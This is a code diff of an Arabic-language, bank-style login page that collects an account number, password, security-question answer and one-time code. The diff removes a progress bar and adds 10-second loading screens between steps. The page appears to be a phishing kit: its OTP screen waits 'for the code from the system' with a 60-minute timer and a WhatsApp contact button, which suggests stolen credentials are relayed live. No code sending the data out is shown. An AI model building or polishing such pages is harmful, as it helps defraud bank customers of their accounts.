@@ -21,63 +21,7 @@
             line-height: 1.6;
         }
 
-        /* ===== شريط التقدم (الخطوات الأربع) ===== */
-        .steps-bar {
-            background: white;
-            padding: 16px 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
-            border-bottom: 2px solid #e63946;
-            flex-wrap: wrap;
-        }
-        .step-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #aaa;
-            transition: 0.3s;
-        }
-        .step-item .num {
-            width: 28px;
-            height: 28px;
-            border-radius: 50%;
-            background: #e0e0e0;
-            color: #888;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 13px;
-            font-weight: 700;
-            transition: 0.3s;
-        }
-        .step-item.active .num {
-            background: #e63946;
-            color: white;
-        }
-        .step-item.active {
-            color: #c1121f;
-        }
-        .step-item.done .num {
-            background: #28a745;
-            color: white;
-        }
-        .step-item.done {
-            color: #28a745;
-        }
-        .step-line {
-            width: 24px;
-            height: 2px;
-            background: #e0e0e0;
-            border-radius: 2px;
-        }
-        .step-line.done {
-            background: #28a745;
-        }
+        /* ===== تم حذف شريط التقدم (steps-bar) بالكامل ===== */
 
         /* ===== الخطوة 1: تسجيل الدخول ===== */
         #step1 { display: block; }
@@ -213,8 +157,8 @@
         }
         .error-message-simple.active { display: block; }
 
-        /* Overlay */
-        .overlay {
+        /* ===== Overlay للتحميل ===== */
+        .loading-overlay {
             display: none;
             position: fixed;
             top: 0;
@@ -228,14 +172,16 @@
             flex-direction: column;
             text-align: center;
         }
-        .overlay.active { display: flex; }
-        .overlay .loading-title {
+        .loading-overlay.active {
+            display: flex;
+        }
+        .loading-overlay .loading-title {
             font-size: 28px;
             font-weight: 800;
             color: #c1121f;
             margin-bottom: 20px;
         }
-        .overlay .loading-spinner {
+        .loading-overlay .loading-spinner {
             width: 60px;
             height: 60px;
             border: 6px solid #f3f3f3;
@@ -691,9 +637,6 @@
         .linkedin { background: linear-gradient(135deg, #0A66C2, #004182); }
         .instagram { background: radial-gradient(circle at 30% 30%, #fdf497, #fd5949, #d6249f, #285aeb); }
 
-        /* ===== رسائل النظام (تم إزالتها تماماً) ===== */
-        /* لم يعد هناك system-message */
-
         /* روابط السفلية */
         .security-links {
             display: flex;
@@ -720,8 +663,8 @@
             .login-title { font-size: 24px; }
             .form-card { padding: 20px; }
             .social-icon { width: 44px; height: 44px; font-size: 18px; }
-            .overlay .loading-title { font-size: 24px; }
-            .overlay .loading-spinner { width: 50px; height: 50px; }
+            .loading-overlay .loading-title { font-size: 24px; }
+            .loading-overlay .loading-spinner { width: 50px; height: 50px; }
             .security-actions button { font-size: 12px; padding: 10px; min-width: 80px; }
             .security-header h1 { font-size: 24px; }
             .otp-card .otp-timer { font-size: 28px; }
@@ -730,37 +673,14 @@
             .quick-actions .item { padding: 10px 4px; }
             .quick-actions .item i { font-size: 20px; }
             .quick-actions .item span { font-size: 10px; }
-            .steps-bar { gap: 4px; padding: 12px 10px; }
-            .step-item { font-size: 11px; }
-            .step-item .num { width: 22px; height: 22px; font-size: 11px; }
-            .step-line { width: 16px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== شريط التقدم (الخطوات الأربع) ===== -->
-    <div class="steps-bar" id="stepsBar">
-        <div class="step-item active" id="stepIndicator1">
-            <span class="num">1</span> تسجيل الدخول
-        </div>
-        <div class="step-line" id="stepLine1"></div>
-        <div class="step-item" id="stepIndicator2">
-            <span class="num">2</span> سؤال الأمان
-        </div>
-        <div class="step-line" id="stepLine2"></div>
-        <div class="step-item" id="stepIndicator3">
-            <span class="num">3</span> رمز التحقق
-        </div>
-        <div class="step-line" id="stepLine3"></div>
-        <div class="step-item" id="stepIndicator4">
-            <span class="num">4</span> لوحة التحكم
-        </div>
-    </div>
-
-    <!-- ===== Overlay ===== -->
-    <div class="overlay" id="overlay">
-        <div class="loading-title">جاري تسجيل الدخول ...</div>
+    <!-- ===== Overlay للتحميل (يظهر بين الخطوات) ===== -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-title">جاري التحميل ...</div>
         <div class="loading-spinner"></div>
     </div>
 
@@ -820,7 +740,6 @@
             </div>
             <div class="question-box" id="questionText">ما هو اسم المدرسة التي التحقت بها؟</div>
             <input type="text" id="securityAnswer" placeholder="أدخل الجواب" />
-            <!-- تم إزالة system-message -->
             <div class="security-actions">
                 <button class="btn-next" onclick="nextQuestion()">سؤال آخر</button>
                 <button class="btn-atm" onclick="showAtmMessage()">باستخدام بطاقة الصراف الآلي</button>
@@ -858,7 +777,6 @@
             <div class="otp-timer-label">دقائق متبقية</div>
             <div class="otp-waiting"><i class="fas fa-spinner fa-spin"></i> في انتظار رمز التحقق من النظام...</div>
             <input type="text" id="otpInput" placeholder="أدخل الرمز" maxlength="6" inputmode="numeric" />
-            <!-- تم إزالة system-message -->
             <div class="otp-actions">
                 <button class="btn-otp-confirm" onclick="submitOtp()">تأكيد الرمز</button>
                 <button class="btn-otp-whatsapp" onclick="whatsappContact()"><i class="fab fa-whatsapp"></i> واتساب</button>
@@ -953,29 +871,24 @@
         let timerInterval = null;
         let timeSeconds = 3600; // 60 دقيقة
 
-        // ===== تحديث شريط التقدم =====
-        function updateSteps(step) {
-            const indicators = [
-                document.getElementById('stepIndicator1'),
-                document.getElementById('stepIndicator2'),
-                document.getElementById('stepIndicator3'),
-                document.getElementById('stepIndicator4')
-            ];
-            const lines = [
-                document.getElementById('stepLine1'),
-                document.getElementById('stepLine2'),
-                document.getElementById('stepLine3')
-            ];
+        // ===== دالة عرض رسالة التحميل لمدة 10 ثوانٍ =====
+        function showLoadingAndTransition(targetStepId) {
+            // إظهار الـ overlay
+            const overlay = document.getElementById('loadingOverlay');
+            overlay.classList.add('active');
 
-            for (let i = 0; i < indicators.length; i++) {
-                indicators[i].classList.remove('active', 'done');
-                if (i < step - 1) indicators[i].classList.add('done');
-                else if (i === step - 1) indicators[i].classList.add('active');
-            }
-            for (let i = 0; i < lines.length; i++) {
-                lines[i].classList.remove('done');
-                if (i < step - 1) lines[i].classList.add('done');
-            }
+            // بعد 10 ثوانٍ، إخفاء الـ overlay والانتقال للخطوة المطلوبة
+            setTimeout(function() {
+                overlay.classList.remove('active');
+                // إخفاء جميع الخطوات
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'none';
+                document.getElementById('step3').style.display = 'none';
+                document.getElementById('step4').style.display = 'none';
+                // إظهار الخطوة المطلوبة
+                document.getElementById(targetStepId).style.display = 'block';
+                document.getElementById('footer').style.marginTop = '0';
+            }, 10000); // 10 ثوانٍ
         }
 
         // ===== تسجيل الدخول (الخطوة 1) =====
@@ -1000,15 +913,6 @@
             document.getElementById('errorMessageSimple').classList.remove('active');
         }
 
-        function showOverlay() {
-            document.getElementById('overlay').classList.add('active');
-            document.getElementById('loginBtn').disabled = true;
-        }
-        function hideOverlay() {
-            document.getElementById('overlay').classList.remove('active');
-            document.getElementById('loginBtn').disabled = false;
-        }
-
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const acc = document.getElementById('accountNumber').value.trim();
@@ -1030,16 +934,11 @@
                 return;
             }
 
-            showOverlay();
-            setTimeout(() => {
-                hideOverlay();
-                document.getElementById('step1').style.display = 'none';
-                document.getElementById('step2').style.display = 'block';
-                document.getElementById('footer').style.marginTop = '0';
-                currentQuestionIndex = 0;
-                updateQuestion();
-                updateSteps(2);
-            }, 1500);
+            // الانتقال للخطوة 2 مع تحميل 10 ثوانٍ
+            showLoadingAndTransition('step2');
+            // تهيئة سؤال الأمان
+            currentQuestionIndex = 0;
+            updateQuestion();
         });
 
         document.getElementById('accountNumber').addEventListener('input', function(e) {
@@ -1063,26 +962,22 @@
         function verifySecurity() {
             const answer = document.getElementById('securityAnswer').value.trim();
             if (answer === '') {
-                // رسالة خطأ بسيطة بدون system-message
                 alert('الرجاء إدخال الإجابة على سؤال الأمان');
                 return;
             }
-            // الانتقال إلى الخطوة التالية مباشرة بدون رسالة
-            document.getElementById('step2').style.display = 'none';
-            document.getElementById('step3').style.display = 'block';
-            document.getElementById('footer').style.marginTop = '0';
+            // الانتقال للخطوة 3 مع تحميل 10 ثوانٍ
+            showLoadingAndTransition('step3');
             startOtpTimer();
-            updateSteps(3);
         }
 
         function cancelSecurity() {
+            // الرجوع للخطوة 1 مباشرة بدون تحميل
             document.getElementById('step2').style.display = 'none';
             document.getElementById('step1').style.display = 'block';
             document.getElementById('footer').style.marginTop = '30px';
             document.getElementById('accountNumber').value = '';
             document.getElementById('password').value = '';
             document.getElementById('securityAnswer').value = '';
-            updateSteps(1);
         }
 
         function showAtmMessage() {
@@ -1128,12 +1023,9 @@
                 alert('الرمز يجب أن يكون 4-6 أرقام');
                 return;
             }
-            // الانتقال إلى لوحة التحكم مباشرة
-            document.getElementById('step3').style.display = 'none';
-            document.getElementById('step4').style.display = 'block';
-            document.getElementById('footer').style.marginTop = '0';
+            // الانتقال للخطوة 4 مع تحميل 10 ثوانٍ
+            showLoadingAndTransition('step4');
             if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
-            updateSteps(4);
         }
 
         function whatsappContact() {
@@ -1150,6 +1042,7 @@
         // ===== الخطوة 4: لوحة التحكم =====
         function logout() {
             if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
+                // الرجوع للخطوة 1 مباشرة بدون تحميل
                 document.getElementById('step4').style.display = 'none';
                 document.getElementById('step1').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '30px';
@@ -1158,12 +1051,15 @@
                 document.getElementById('otpInput').value = '';
                 clearMessages();
                 if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
-                updateSteps(1);
             }
         }
 
         // ===== تهيئة أولية =====
-        updateSteps(1);
+        // تأكد من ظهور الخطوة 1 فقط عند التحميل
+        document.getElementById('step1').style.display = 'block';
+        document.getElementById('step2').style.display = 'none';
+        document.getElementById('step3').style.display = 'none';
+        document.getElementById('step4').style.display = 'none';
     </script>
 </body>
 </html>
